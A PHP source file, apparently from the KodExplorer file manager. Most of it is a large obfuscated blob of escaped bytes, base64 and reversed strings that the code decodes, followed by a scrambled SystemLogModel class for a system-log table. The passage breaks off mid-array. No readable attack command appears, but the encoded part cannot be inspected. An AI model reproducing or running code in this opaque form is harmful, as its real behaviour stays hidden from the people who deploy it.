x1f\x81\xa2\x18\xe4\x2f\x11\x67\x51\x9e\x61\xd8\x3e\x3c\xc4\xb4\xa5\xda"."\300\20\306\217\332\346\307\226\17\11\337\313\165\333\142\11\166\131\344\354\75\325\51\222\116\342\140\170\255\235\251\366\160\3\322\302\154\60\225\361\323\260\60\267\213\330\367\300\0\66\31\142"."\x16\x98\x9b\x1a\xea\x40\x40\xb6\x36\x9e\xd6\x49\x73\xf9\x4b\x77\xc9\x50\x37\x76\x62\x81\x96\x3a\x53\x7\x94\x4c\x76\x23\x86\x70\x80\x4f\x23\x31\xa4\x2b\x1b\x44\xc4\x43\xee\xcd\x3b\x7c\x57\xd0\x9\x72\x1a\xc2"."\266\164\175\220\251\57\342\331\26\24\245\304\355\225\323\253\137\157\125\200\127\122\110\244\353\111\362\151\200\77\7\162\200\54\365\226\0\355\245\77\47\124\153\275\267\44\114\210\243\331\241\276"."\x17\x16\xe8\xa3\xcc\xd4\xf3\x57\x5b\x8b\xee\x6d\xef\xed\xec\x4d\xca\xdd\xb5\x4b\x5a\x26\x83\x1a\x2b\x99\x3a\xe5\x93\x28\x6c\x86\x3\x26\x11\x1f\x24\xac\xfb\xe3\x5b\x1c\x87\x3b\x8d\x49\x55\xd\x96\x43\x62\x9c"."\xf6\xbb\x15\x9f\xbc\x46\xb0\x83\x8\x61\x67\xb3\x3b\x1e\x71\x5c\x54\x41\x56\xd6\xc3\x95\x59\x6f\x2b\xd3\x4\x33\xcb\xb9\x34\x39\xcd\xa2\x4f\x99\x39\x74\x90\x17\x57\xd6\x5b\x2f\xbf\x76\xeb\xdd\x97\x6e\x7f\xec".strrev('Áv4¡ª&ìı$«¼o·s‘àøo—±á¾İ?ÃÛdüç­÷ŸõˆéÂˆ®·‡å´ßç­š')."\x29\x5b\x2f\xbd\x73\xec\x82\xb3\xb7\xdf\x7b\xda\xd6\x87\x2e\xdc\xfa\xd3\x53\x77\x5c\x79\xe1\xbb\x27\x9d\x2\x2b\xa7\x40\xc\x7e\x6\x4a\x3\x65\x31\x4e\xb4\xc8\xd6\x6b\x1f\x19\x7b\xe4\x82\x1d\x97\x5c\xb9\x7d".base64_decode('40Ypv40V5nLS0kGzOHb6uh2n3jp2wUXbLvlZRQH6Afc84+5deua2q06TUtyFWogRdHGE5w==')."\145\150\302\330\205\347\155\273\345\116\167\41\152\25\277\112\241\255\227\235\261\345\341\373\134\205\242\146\242\234\312\266\110\326\326\267\236\173\306\330\206\253\370\107\266\74\160\36\325\135\167\25"."\341\52\162\74\77\255\277\62\177\202\141\164\320\324\55\264\217\166\152\66\173\117\265\355\216\107\121\173\350\210\311\63\67\266\361\364\155\327\236\274\355\216\263\140\46\256\330\70\166\341\315\133"."\357\270\141\333\165\33\170\265\200\125\16\155\135\134\301\246\123\266\337\267\156\353\345\367\361\214\170\311\247\25\221\207\140\24\315\203\365\364\311\7\267\155\276\150\333\303\353\61\222\234\175\312"."\266\123\36\34\133\177\347\330\117\117\342\237\35\173\340\1\61\312\61\77\161\343\125\205\330\56\304\160\40\267\31\241\340\135\54\113\376\344\144\2\207\131\62\256\343\211\205\124\324\201\1\343"."\264\210\257\1\360\203\323\314\26\55\32\307\102\213\311\136\221\255\252\101\244\263\246\251\346\230\72\364\133\137\343\251\301\7\20\22\307\304\23\3\110\73\152\232\216\251\43\201\172\260\132\264".strrev('İQ ·aº‡ÒÁ÷ÍÕ^ğ¢ş7ÆÙú7ôk“xClŸ9Át‡¨º xX±hÉ'."\r".'ö')."\66\113\262\336\163\43\173\134\231\225\366\215\74\173\343\106\335\1\10\271\27\240\36\325\71\274\360\274\112\244\203\2\375\124\263\330\221\375\376\273\306\326\335\275\343\362\73\334\171\251\140\5"."\362\142\366\254\302\1\42\175\334\61\166\321\25\225\337\43\371\235\137\143\231\307\116\136\277\355\22\127\116\246\150\253\110\22\64\121\200\140\277\213\216\360\175\101\56\102\361\375\177\263\212\250"."\74\263\11\113\366\51\140\211\267\273\70\132\56\170\261\204\313\233\220\15\132\272\74\370\64\70\363\143\31\225\63\277\314\57\244\304\276\233\27\101\352\131\250\111\221\375\176\111\266\271\211\374"._kodDe('Ll6DPFz55YhQUIWxEFRGQ7S8BpgN3j4o0GtH2qEHeuihfWh1kQtbkYIpbcN7hIGty2uEOAQ=')."\21\54\60\365\312\256\255\106\320\11\15\47\143\257\44\136\54\176\365\32\351\361\122\4\341\250\332\324\24\270\63\250\226\245\273\154\244\335\237\44\52\72\336\162\231\175\260\152\245\362\371\221"."\145\40\235\10\363\372\34\16\71\64\64\327\374\206\321\355\357\103\34\276\265\112\257\24\113\363\151\245\161\132\323\214\143\321\137\340\62\230\206\121\271\310\236\13\240\40\363\132\161\224\77\303".base64_decode('aI1wDMX6hidccqLiAIth5D4qGJFy5BOtdbg1g45S2Y/k9YXc/VAShfXuVO4dpwq1NpjnIw==')."\311\267\52\237\207\1\26\50\361\43\276\46\126\106\177\156\120\164\200\220\25\100\354\101\324\76\123\34\224\10\213\52\21\204\124\266\134\30\154\226\22\25\333\64\225\274\126\30\205\363\347\104"."\xab\x69\xa2\x35\x7\x7f\xa8\x19\x3f\x5\xb1\x26\x32\xd7\x48\x78\x63\x12\x36\x3a\xa9\x99\x28\x48\xa1\xd7\x5a\x3e\xec\xd8\xcc\x87\x77\xbd\x78\x19\x72\x75\x11\x9a\xe\xbb\x1c\x75\x2b\x5\x9\x91\xee\xf6\x70\x54"."\xd2\x5\x94\x0\x6a\x6b\x30\xaa\x6\xba\xba\xaa\x26\xc0\xb0\x53\x61\x33\x56\xa4\xf1\x2d\x97\xbc\x5a\xd2\xd0\x5c\x74\xf4\x52\x52\xf8\xf1\x51\x73\xd\x86\xd6\x28\x56\x29\xc5\xc\x59\xd7\xf8\x41\xb5\x8c\x64\x10".base64_decode('XNBcA4rU4iJKBuGEl4Rocu28uX4DSvr8R2Ma7cdKdYVJeOpkHR8CbROWthRlrqbQ4WquJQ==').base64_decode('Vye1Shbt41yjeJ67MPdENtevyYl4tcRNdj7kZ/IhbpOy6q1ZQLJwTzwDtWqFRZVFcOW+lA==')."\x9c\xd4\x43\x1f\x9e\xf5\xc9\xd3\x47\x9e\x7c\x55\x96\xf6\x13\xd9\x90\x5f\x8\x23\x54\xea\xad\xb3\xfa\x9d\x23\xbf\x6a\xab\x82\x18\x58\x67\x6\x61\x33\x53\x56\xd0\x52\x83\x18\xb3\x4\xcd\x87\x66\x40\x42\x17\x16"."\55\320\4\207\63\17\133\122\163\52\343\227\217\344\342\246\44\234\240\255\132\105\53\302\216\152\326\254\251\204\201\342\264\73\51\120\64\334\40\214\101\156\30\26\361\10\30\332\274\234\237\241".strrev('†õ™Ï¯xÓsÇÖV&Õ2©ƒ~5šòo­OoX‘<©‡±#¹ÃĞˆ»h‘2Šş‡–g+Ø')."\147\4\200\73\47\145\114\217\207\105\270\237\177\262\170\255\311\325\10\25\254\133\330\334\74\257\207\363\113\175\54\115\45\222\21\171\356\30\277\151\114\235\315\220\2\35\10\223\213\171\260\65".base64_decode('Kjhqvi4opfERGV3AaSp7vvATR8dZDgeKRQdJYRF8i5Uz+v2cDtCbLV9KPIdkWQgVcsGxVg==')."\240\53\1\373\341\46\340\41\104\46\315\22\247\133\34\216\352\342\100\100\163\114\133\44\122\302\223\347\132\251\222\121\264\35\164\215\72\76\256\41\56\305\226\153\103\32\315\122\243\200\374\255"."\xb9\x86\x78\x88\xa8\x41\x74\x8c\xa6\x30\x62\xc6\x1b\x38\x17\x7f\xd\x31\xb9\xb9\xe6\x1a\xd2\x9\x2b\xab\xeb\xa8\x3c\xa1\x55\xd5\x3e\x82\xa\xd6\x28\x8c\x9a\xe6\x35\x3e\x8e\x25\xdb\x44\xbb\x22\x7f\x4d\x7\x1e"."\x1c\xbb\xe3\xf0\xa\x29\x10\x85\xfb\xc4\xa3\x4f\xa4\xbf\xc7\x1c\xcd\x30\x89\xb8\x97\xcc\x21\xee\x97\xbc\xb1\x20\x74\x8b\xb0\xd8\x19\x2c\x57\xa5\x99\xc0\x93\x64\x57\x3c\x96\x8c\xb5\x32\x6f\x6c\x4e\x1\x2c\x85".base64_decode('TWfHBYs+LBUnLPZEjqsWsRycT/ADBLChVC4UuFYnxle+vzVX/9NDrjz1dN846UqPxi5EgQ==')."\272\322\33\136\366\14\24\332\211\166\322\44\176\44\157\1\130\62\304\211\315\200\352\151\137\17\175\352\337\334\300\336\111\61\35\122\361\202\222\345\224\123\24\274\65\364\361\121\107\353\337\17"."\344\123\254\254\132\174\207\7\376\222\152\75\265\165\276\311\365\265\225\51\124\133\327\231\216\125\341\324\343\23\50\21\274\23\301\26\117\36\42\266\106\302\241\150\122\15\303\356\76\265\161\226"."\xaf\x41\x3c\x12\x34\x2c\x61\xd8\x96\x86\x5b\x65\x3\x6\x78\x54\x7d\x8e\x6e\x55\x19\x1a\x7a\x89\x92\xe4\xba\xa6\x7a\xc1\x21\x53\xa5\x43\x9a\x33\x99\x79\x98\xc6\x86\x86\x6\x6f\xc3\x54\xf4\x97\x3d\x9e\x60\x86"."\36\233\230\45\17\51\113\103\103\23\371\113\23\310\105\6\240\240\63\5\221\104\106\313\41\303\260\256\103\203\140\357\104\147\336\62\343\54\173\132\361\363\117\5\67\15\246\105\350\312\42\354"."\43\226\120\31\131\165\370\272\124\310\205\76\304\164\61\10\171\311\77\143\2\54\347\16\70\260\235\311\373\251\225\154\266\155\242\106\15\220\1\202\266\363\227\305\50\233\130\101\163\350\373\357"."\x66\xde\xc0\x50\x21\xdd\x23\x7f\xcc\xc7\x6\x9a\x2\x85\x85\x78\x2f\x4b\xf0\xca\x2e\x5a\xa0\x10\x25\x7a\xe2\x42\xd0\xd1\x34\x54\xc6\x69\x6e\x15\x43\x10\x97\x93\xe2\x7d\xc6\x0\x49\xf6\x8a\x59\x58\xc9\x84\x2c".base64_decode('jsr3fiSZP88lsRw3MoKjUV4T9QSkav38lrfaisyaw6rgU3D0eB4jQ4rPkAwl09ITajyubA==')."\x7f\x92\xb2\x73\xed\x34\xa1\xda\x3\x9a\x4a\xc4\x72\xc6\xa0\xe1\xb4\xec\xa1\x4a\x45\xe5\xb1\x9d\x83\x33\xb2\x9e\x24\x9d\x25\xb1\x23\x62\xdc\x50\x2f\x6e\x77\x93\x18\x45\x44\xdf\x2\xdc\x47\x12\x55\x66\x66\xed".base64_decode('VYDi0CixIU898BJJTdN+FRNuuyebzJvj+sKtJshi0uyxG63E12jyMUiIAehdXCu3vypV4A==').base64_decode('TnKVCdCLsIoCAK/MTe4Lq+TGcFduYmm1lRuUls2vUiGTpDFmgdsMoa7D6hiSjpy+YskcQA==')."\x98\x60\xc9\x83\x86\xe0\x5d\xd5\xc1\x3c\x7b\x65\xce\x2a\x99\x78\xeb\xe5\x7c\x32\x10\xdf\x4c\x32\xd7\xde\x80\x5a\xc2\x4a\x81\x96\xe6\x9b\xa7\x94\x55\x58\x65\x90\x80\xce\x15\x2e\x25\xb4\x72\x57\x66\x32\x10\x9f".base64_decode('ZWUFLXLqcNaBD8lOCG/ZVyAdk2nY4Pdd1mmm2QSVwvIm2dGk6kAThqtMHwyPkNC8cMIpjA==')."\x4a\x1d\x1c\xd7\xbd\x49\x42\xfc\x72\x3a\x73\x43\xf\xe4\x91\x2c\x2a\x5c\x41\x84\x79\x26\x4e\x38\xac\x95\x3\x9a\x36\x31\x5e\x45\x2e\xe6\x4c\xfb\xcb\xe9\x17\xb1\xc0\xc5\x2c\x17\x1e\x56\xee\xdc\x53\xbe\x58\xc3"."\103\252\312\2\41\274\242\73\270\247\363\52\210\350\104\266\12\254\42\373\72\256\240\211\223\45\51\206\153\147\167\232\350\24\155\121\361\246\7\203\25\352\61\133\301\176\300\217\162\316\117\145"."\1\160\50\146\42\356\22\33\163\226\13\341\272\272\135\44\152\1\247\222\70\306\333\112\131\73\246\313\252\114\364\65\202\236\355\104\346\120\204\322\150\241\115\341\207\156\367\240\156\365\241\243"."\x90\xd8\x61\x60\x42\x7a\x28\x85\x66\x75\xe2\x26\x43\x28\xcd\xe6\x47\x71\xee\xb8\xd2\xfe\xa1\xc8\x15\xa1\x9d\x38\x99\xc5\x42\x9d\x3e\x85\x34\x73\xe\x71\x47\x51\x25\x15\xdb\xe1\x60\x5f\xe3\x86\xad\x81\xf2\xa3".base64_decode('PKbNj8+4+kBa2lIjMv+bpEW880RTHaoCklF9nhU1gzVeY20juqHEeYF0ondF3Zq0uITE8Q==')."\240\250\264\33\23\136\300\146\333\71\163\135\40\64\120\111\120\20\340\277\134\161\72\13\254\23\170\224\220\24\27\253\264\17\152\345\165\342\26\110\316\350\201\251\51\351\51\263\224\306\33\242"."\144\11\247\140\307\365\1\71\112\264\22\330\152\20\146\317\345\52\260\321\61\211\354\340\125\30\110\331\145\331\204\231\344\31\1\305\44\347\31\22\243\352\235\252\160\16\127\245\65\323\310\24"."\51\201\344\257\306\354\272\104\263\322\243\66\42\271\112\224\373\371\45\263\213\355\144\357\344\24\231\253\143\17\337\160\5\304\172\24\356\201\45\247\241\152\261\105\162\321\63\271\10\371\146\105".base64_decode('EZqGGSvxQk5OsbAPjG42i9VSqnyKJEkjmuKcNoyOGCRIGNWZ6rZ3aqN3Gpxw5Fdz7PAG+w==')."\10\132\130\22\32\340\343\57\43\143\240\370\14\371\104\36\123\272\256\47\366\232\204\271\31\142\202\212\317\47\261\125\305\143\45\211\227\20\76\346\211\61\47\231\254\13\115\44\252\53\215\63"."\164\127\113\247\43\204\223\203\16\355\166\127\6\264\76\234\351\340\344\102\64\206\332\223\62\35\332\206\256\112\300\31\213\354\306\203\224\22\375\20\117\0\20\310\244\256\64\244\201\21\32\125"."\324\314\25\173\343\300\211\234\0\47\115\16\254\324\312\302\130\11\125\122\363\2\160\42\256\253\307\346\5\34\322\310\316\121\376\10\34\153\74\342\115\232\353\264\133\162\204\245\162\344\264\34".base64_decode('Earh6SjNQTzXsM4sBbCTfFdHl5+DWvjypIIUYUWvlalR6iM6HPqG80ZKicTaw62BSDCcWA==')."\xa0\xc\xe0\x2b\x56\xa1\x5d\x88\x9a\xab\x92\x65\xab\x5a\xc2\xaf\xc\x71\xad\xe3\x5c\xe0\x44\xb6\x4c\xa7\x83\xe1\x7a\x3f\xf7\xd5\x82\x83\xde\x7e\x74\x8e\xf0\xa6\xf9\xf9\xcb\x12\x27\x2d\xd2\x43\xa8\x4c\x38\xc3"."\163\126\113\261\122\57\125\324\130\300\317\374\162\25\145\260\304\274\112\356\234\220\17\113\231\213\45\275\62\377\250\216\265\34\245\26\113\5\312\125\132\3\371\253\177\201\70\332\221\163\43\366"."\110\57\214\327\170\243\60\144\130\206\40\7\254\304\250\134\173\40\330\31\216\252\201\110\44\266\330\241\45\54\356\12\112\134\320\222\226\375\44\111\63\43\46\201\176\275\322\204\43\30\314\223"."\x1d\x49\xb8\x84\x2f\x74\xfa\x64\xb\xa1\x45\x76\xad\x5\xce\x5b\xb9\xf3\x13\x1a\x95\xfc\x98\x15\x4b\x9a\x61\xe9\x12\x80\xba\xdc\x9a\xa\x2f\xe7\xb4\x5c\xce\xe1\x8e\x34\x97\x91\xa2\x65\xe7\x7e\x5b\xf5\x53\x2a"."\xfd\x0\x83\x11\x46\x77\xfc\xc\xf1\x70\x7b\x47\xf2\xbf\x6e\xaa\x91\x16\x56\xfe\x8c\x34\xd3\x2f\xe3\xaf\xa4\xa9\x5f\x94\x56\xd9\x7d\x2d\xfb\xa6\xf0\xbe\x53\x9\xf9\x6f\xfd\xc0\x79\xc4\xd5\xa0\x4a\x4c\x9f\x31"."\x4f\x93\x26\x39\x36\x1\x4f\x4f\x61\xe1\x98\x4a\x84\xe6\xaa\xf8\x4\xe2\x62\x4a\xa3\x45\xf9\x4a\xd6\x9f\x86\x1a\xb0\x95\xd3\x10\x7b\x26\x84\x23\xe2\xdc\x82\x73\x41\x25\xf8\x2b\xf4\x34\x8b\xe\xe9\x58\xe0\xc8"."\116\70\114\170\207\310\10\14\270\103\247\322\345\310\316\255\54\357\160\123\127\361\15\342\372\204\246\221\233\53\224\263\117\364\11\305\270\253\43\121\324\235\122\245\1\50\131\21\142\60\236\101"."\151\126\32\250\117\105\356\306\106\231\313\154\101\210\17\20\233\204\241\174\321\166\234\364\73\344\207\63\322\224\120\0\226\11\225\270\200\217\316\71\213\342\211\145\227\307\246\52\357\235\204\16"."\x8b\xf3\x1f\x56\xb7\x34\xf3\xa3\x15\x0\x87\xc4\x2c\xc2\x7a\xc3\x15\x9f\xb1\xeb\x9f\x42\xc6\x94\x47\x9d\xd0\x73\xfc\x76\x8a\xba\x4a\xa5\x82\x8\xf\x3a\x8f\xe8\x76\xa5\xef\x35\x5a\xfc\xff\xa6\x20\x4d\x4c\x48"."\46\153\235\225\124\66\310\162\357\237\202\227\303\156\345\262\346\260\323\177\52\206\270\35\311\71\134\310\111\53\214\130\66\220\235\336\71\13\171\52\134\60\51\304\375\265\202\210\21\314\75\126"."\332\141\7\135\222\131\372\364\104\372\323\13\277\154\67\164\67\202\322\71\370\144\75\107\305\326\254\221\113\227\270\72\226\0\164\352\102\372\100\112\41\302\122\324\230\233\157\342\142\62\310\110"."\x3a\x78\x7d\xaa\xe6\x5d\x10\x5b\x22\x75\x3a\xaf\x12\x3e\xc1\xc4\xd6\xeb\xf4\x91\xc4\x75\x0\x2c\xb1\x84\x2c\xdb\xe1\x95\x2b\x69\x26\xb5\x1\xf\x45\x55\x4c\x14\x45\xac\x65\x54\xe\xcb\xca\xf8\xa4\x17\x28\x91"."\111\10\323\174\276\347\111\31\230\217\316\264\207\70\220\244\164\321\355\126\112\132\237\234\374\312\245\7\210\311\115\320\25\164\274\264\53\241\43\232\316\266\20\107\66\12\362\153\305\242\270\57"."\x91\x77\x5c\xf4\xbf\xe3\x11\x35\xa4\x75\x27\x3b\x54\x62\x56\x44\xa5\x4a\xd\x9\x81\x73\xd2\x1d\x26\x5\xc2\x7d\x66\xb9\x10\xa6\xf7\x36\xe\x68\x49\x3a\x3c\xca\xc6\x9e\xe9\x5d\x8e\x78\x8b\xb\xd9\x51\x3b\xbb"._kodDe('K9jb/yBPi64Y2kNqpYI3DOtSzvRsyIJzvwOV5irgNct3g+tqQjSDvoy1/5ETHsa3o5mkSSQ=')."\x21\x6e\x9b\x7a\xeb\x24\x44\x43\x26\x6e\x5f\x1\x95\xbc\x9f\x81\x57\xd0\x6a\xce\xcc\xe8\x22\x20\x3f\x41\x3d\xc3\xf\x4d\x38\x2e\xd8\x4\xd9\x4a\x92\x50\xc8\x71\x3b\xec\xac\x74\x3e\xca\x1c\x8d\xb2\x55\x4\x5e"."\x46\xab\xb8\xe\x1d\xd7\xf3\xa8\x47\xbc\xc0\xfe\x2a\x1f\x69\xe2\xbd\xaf\xd3\x7d\x3c\xee\x7\x67\x32\xf8\xb9\xa4\xe2\x68\xe3\x3e\xd5\xf0\x61\x75\x15\x88\xbb\x7\x39\x69\x56\xca\x9f\x85\xb6\x82\xc3\x2f\xaa\xd4".base64_decode('a6Bylb5VpWGQ+l0u5TxEccPDlB+rumd1eGxzT2gVB69fWyE8fCCHurSTADbN7S+xG253Ng==')."\303\201\273\150\57\26\217\0\251\75\347\212\275\142\151\76\335\70\155\306\261\262\360\104\114\241\270\367\145\206\366\351\17\260\73\2\51\24\47\32\52\314\210\264\114\10\110\242\363\45\115\245"."\x2f\x60\xd7\x66\xf0\xdf\x2d\x18\x71\xe\xa1\x59\x25\x5\xdd\x4a\x77\xe9\x15\x23\x40\xf0\x54\xd2\x1c\x93\xf6\x46\x97\x8a\x90\x89\xb5\x76\x2c\xb1\xea\xe8\x6e\x28\x3c\x0\x3b\xbf\x45\x39\x89\x2a\xfd\x90\xb6\x40"."\261\130\250\127\127\63\207\317\360\171\174\67\140\227\64\347\321\264\332\11\214\214\4\73\356\141\361\256\210\71\225\250\100\132\43\222\245\43\232\134\243\155\272\105\115\270\70\336\42\211\330\64"."\126\310\301\16\216\315\123\210\325\46\121\242\377\142\2\331\151\213\36\314\204\366\30\356\276\343\220\356\34\5\377\161\214\314\124\361\334\53\351\326\174\105\37\50\323\307\117\231\136\315\366\112".base64_decode('yCmJKnU7RiYbyIU4DDv77aoeFRN19HmU8TJVcn6Sg19hGFHi+XBp9rh8HFkCedvs5J5kJw==')."\242\344\141\260\260\353\103\226\256\143\31\113\66\333\345\207\265\244\42\171\175\124\126\55\271\144\25\22\50\42\262\202\36\301\342\46\312\26\244\231\201\166\376\54\133\223\124\1\235\142\61\340"."\363\44\127\344\150\370\44\157\335\246\34\226\134\375\242\75\41\306\336\115\240\346\70\116\264\50\36\164\171\162\47\364\313\355\336\235\215\31\41\32\302\57\65\141\202\47\3\373\53\77\376\167"."\234\241\270\317\112\307\231\312\162\73\256\105\74\242\303\363\110\272\302\115\70\220\121\362\206\216\176\115\332\210\305\236\53\102\321\162\136\104\44\121\63\71\210\361\104\207\215\4\154\14\320\105"."\x31\x98\xe5\x5\xcb\xe5\xa\x9b\xda\x19\xa7\x61\x76\x5e\xf8\x5f\xfb\x6c\xfd\x7f\xe5\xaa\x75\x6\x77\x72\xe3\xf0\xe\xdf\xe\x5c\x3b\xb4\x16\xdf\xbc\x72\x21\x8\x15\x48\xbb\xfa\xe1\xdc\x6c\xf7\x5\x9c\x42\x83".strrev(''."\n".'¨\'İ¬s0y÷rı»_¸‹W/È8¨FâøTç?W%´œ¹iÌ]H™!g%×8“Óœ“ï').strrev('>h›"§$tôO=r¬‘‚º\\v1UeÎÃÄìÌ„N×Tˆ!u&òyuó{&+U†')."\142\215\230\311\116\77\13\245\360\201\224\30\246\201\151\220\215\7\304\212\354\350\132\17\233\113\337\161\214\10\22\203\45\100\13\145\372\347\0\125\120\315\244\143\162\35\100\171\336\4\151\363".base64_decode('MbxwlOh0ORummSx5bJ32DyQl0krNjcqaOHGRi+B3AU5BHJ5i3Ehvg9cFmOp1Vcd9LzsXkA==').base64_decode('wxkw1XZBqy6OBS5M8EYuuMhNt7eyDF0sCZFnnOVanWjwRgnhIw7J48GIT1fJJLyoE8qFUA==')."\222\366\166\112\222\360\272\331\113\12\236\350\253\330\30\31\35\166\314\32\126\37\24\27\253\311\130\74\244\56\16\143\243\27\341\23\102\335\314\150\263\141\22\277\47\254\312\356\316\72\362\50"."\16\26\3\72\50\265\231\2\255\164\104\41\45\161\263\260\74\154\347\213\255\374\32\330\371\254\132\172\211\301\54\176\311\2\120\147\146\374\212\306\271\56\347\125\313\226\62\113\226\154\266\323"."\221\210\71\73\23\245\306\331\251\275\273\200\26\265\236\262\365\264\202\171\4\307\261\241\147\172\303\264\276\257\252\5\245\363\234\323\277\46\47\234\137\22\323\274\114\323\230\345\251\132\316\244"."\26\172\252\245\141\67\367\266\3\211\204\323\34\267\263\234\66\207\365\253\46\111\40\253\20\73\140\340\65\151\234\271\211\232\255\202\173\161\245\141\62\61\176\52\76\0\363\273\156\346\70\5".base64_decode('a+75sZkw/FTET/AP5OhL1bzKlJaw2EHIkQj1rTx2wpfs0misFM9HK8znOV99SeWJdIkKjA==').base64_decode('HHIj0F6QQdJtPjrxpZ3uyUgiATP74VCDdB/tVAfgD2ortt2yEZGSSSlmhxb9YrsAYWHGiQ==').base64_decode('JNM7tcCQxi2luUt1O07TkvJAitCQUOX9sLi2llhYVgwfxwU/4YJLNFfskNqQYMjFgTCdbg==')."\xd3\x86\xaa\x64\x4d\xeb\x6e\x4b\x77\x8\xc2\xb3\x12\x86\x5e\x32\xe8\x21\x1e\xf6\xe8\xc3\xf2\xd7\x21\x9f\x78\x77\xe3\xc8\x58\x9\x15\x6\x3f\xa4\xf2\xe2\x4e\x50\x74\x13\xc3\xaa\x75\x9f\xd0\x40\x67\x71\xd9\xa0"."\x8\x47\x2a\x1\xa2\x8e\xa6\xb8\xa6\x8d\x74\xf8\xc6\xaa\x48\x42\x5\x87\x76\x85\xcb\x98\xc4\x27\x9d\xe6\x4b\x78\x36\x3e\x67\x28\xf\x79\xe2\xe7\x75\x40\x5d\xe2\x4\x2c\xce\x63\xec\xa7\x2b\x9\x4\x5c\x52\xf5"."\125\345\140\22\12\350\271\210\124\235\254\57\60\156\201\104\365\217\10\254\164\16\261\144\367\105\44\60\6\307\164\14\276\264\253\361\216\101\316\270\234\350\150\216\173\152\311\351\127\240\57\5"."\346\311\265\2\115\13\70\223\150\176\335\325\172\271\200\273\147\264\204\303\63\241\14\37\66\354\124\126\72\252\127\46\126\302\113\25\203\15\15\250\336\17\167\153\331\130\273\5\30\242\222\212"."\xf6\x48\xca\x48\x49\xb3\x4a\x19\xda\xa2\xaa\xc5\x68\x12\x2e\x29\xce\x44\x8e\xb2\xe3\xc\x1\x2e\x4b\x93\x70\xd9\x8a\x64\x56\xb8\x62\x5c\x49\x39\x5b\x2b\x5b\xe3\x74\xaf\x72\xf0\x40\x20\x96\xae\xd2\x61\x21\x36"."\222\262\216\67\236\125\63\127\176\16\60\321\235\233\110\320\252\267\102\10\276\134\352\37\325\132\121\65\363\270\255\160\347\26\134\11\76\370\126\113\161\350\120\71\167\224\152\164\233\245\124\241"."\xd4\x94\xa\x8d\xab\x5c\x25\x14\x8e\x2a\xb7\xc\x91\x56\x45\xfd\x89\x7e\x12\xf3\x47\xb2\x49\xc9\x2a\xc9\xb2\x2e\x55\x75\x6d\xab\x78\x55\x2a\x63\x39\xd5\xa0\x5c\x70\x79\x80\xc0\x20\x3a\xf0\xd8\x80\xc0\x88\x49"."\313\31\203\102\315\224\275\74\231\350\330\112\312\205\301\202\311\267\247\264\320\42\306\274\125\240\344\36\347\212\332\234\250\137\50\113\106\350\253\76\204\361\140\351\124\245\344\47\247\361\327\211"."\x42\x13\x8f\x9e\xb0\x4d\x74\x18\xd4\x9d\x96\xee\x65\xcb\x92\x34\x9d\x7d\x24\x27\xc9\xc2\x5d\x62\x68\x21\x2b\x73\x28\xe4\x54\x11\xce\x12\x10\xd\xfa\xc4\x8d\x10\xad\x4f\x62\x8e\x4\x4e\x38\xde\xac\x51\x96\x4"."\56\322\350\165\174\53\326\21\341\27\261\304\10\73\335\302\151\162\302\54\331\36\234\226\64\213\344\267\305\264\155\241\335\102\305\121\204\21\307\373\260\107\122\336\102\41\161\353\212\33\105\356".strrev('ææ¡íÄi+Â#œÌ#›÷LĞ`T»+hPY·‘A»àˆç:¦	<å€ ‚EŠÚğ')."\55\5\133\4\250\50\253\242\21\133\47\226\237\246\370\301\255\222\227\324\1\276\125\175\313\213\3\216\342\324\133\45\127\44\377\252\32\340\6\101\124\101\175\252\20\161\56\274\251\113\44\23"."\x15\x49\x5d\x81\x44\x62\x71\x2c\x1e\xa4\x2e\x58\x2a\x92\x49\x29\x49\xe1\xaf\x22\xa9\xab\x23\x16\x1d\x2f\x2d\xd4\x19\x8\x47\x2a\xd2\xb0\x6e\x60\x54\x15\x86\x41\x69\x52\xb8\x8b\xb4\x92\xdc\x85\x8f\xd7\x8a\x70".base64_decode('6wLRkkp7rOzCLgLuNsW8SBdYxazJ7qVY/oSWY6Ij6YJDzwvLsaKMUyImz7/FTDzzgNPvoQ==').strrev('RGyQá|«“'."\0".'O~ò›„’ˆD5“‚E-CŸuçÎÓ†ºìP¼wP¢ı5„T6!—UK')."\xc5\x0\xe0\x86\x1d\x6f\x82\xf2\xe8\x72\xb3\x5f\xba\x6c\xa3\xa7\x2c\x78\x13\xf\x43\x2a\x69\x73\xd2\xb0\x23\xd9\xd6\x6\xaa\x6a\x67\x50\xc9\x35\xa6\x12\x42\xa6\xfc\x7f\x0\xa6\x6\x8d\x6c\x52\xb9\x0\x0".""."".base64_decode('').strrev(''), 10, -8))); goto C‡ŠŒ‹ƒâ; C²ÑË¬×ÆÒ: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\x65\x6d\137\154\x6f\x67"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\x54\151\x6d\145", "\x74\x69\x6d\x65", "\151\x6e\x73\x65\162\164", "\146\x75\x6e\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $”ˆÓ“Å =& $_SERVER[ü¢ÙÊñÛ]; return array($”ˆÓ“Å[2329] => LNG($”ˆÓ“Å[2330]), $”ˆÓ“Å[2331] => LNG($”ˆÓ“Å[2332]), $”ˆÓ“Å[1901] => LNG($”ˆÓ“Å[2333]), $”ˆÓ“Å[2334] => LNG($”ˆÓ“Å[2335]), $”ˆÓ“Å[2336] => LNG($”ˆÓ“Å[2337]), $”ˆÓ“Å[2338] => LNG($”ˆÓ“Å[2339]), $”ˆÓ“Å[2340] => LNG($”ˆÓ“Å[2341]), $”ˆÓ“Å[1931] => LNG($”ˆÓ“Å[2341]), $”ˆÓ“Å[1932] => LNG($”ˆÓ“Å[2342]), $”ˆÓ“Å[2343] => LNG($”ˆÓ“Å[2344]), $”ˆÓ“Å[2345] => LNG($”ˆÓ“Å[2346]), $”ˆÓ“Å[2347] => LNG($”ˆÓ“Å[2348]), $”ˆÓ“Å[2349] => LNG($”ˆÓ“Å[2350]), $”ˆÓ“Å[1929] => LNG($”ˆÓ“Å[2351]), $”ˆÓ“Å[2352] => LNG($”ˆÓ“Å[2353]), $”ˆÓ“Å[1936] => LNG($”ˆÓ“Å[2354]), $”ˆÓ“Å[2355] => LNG($”ˆÓ“Å[2356]), $”ˆÓ“Å[2357] => LNG($”ˆÓ“Å[2358]), $”ˆÓ“Å[2359] => LNG($”ˆÓ“Å[2360]), $”ˆÓ“Å[2361] => LNG($”ˆÓ“Å[2362]), $”ˆÓ“Å[1939] => LNG($”ˆÓ“Å[2363]), $”ˆÓ“Å[1940] => LNG($”ˆÓ“Å[2364]), $”ˆÓ“Å[2365] => LNG($”ˆÓ“Å[2366]), $”ˆÓ“Å[2367] => 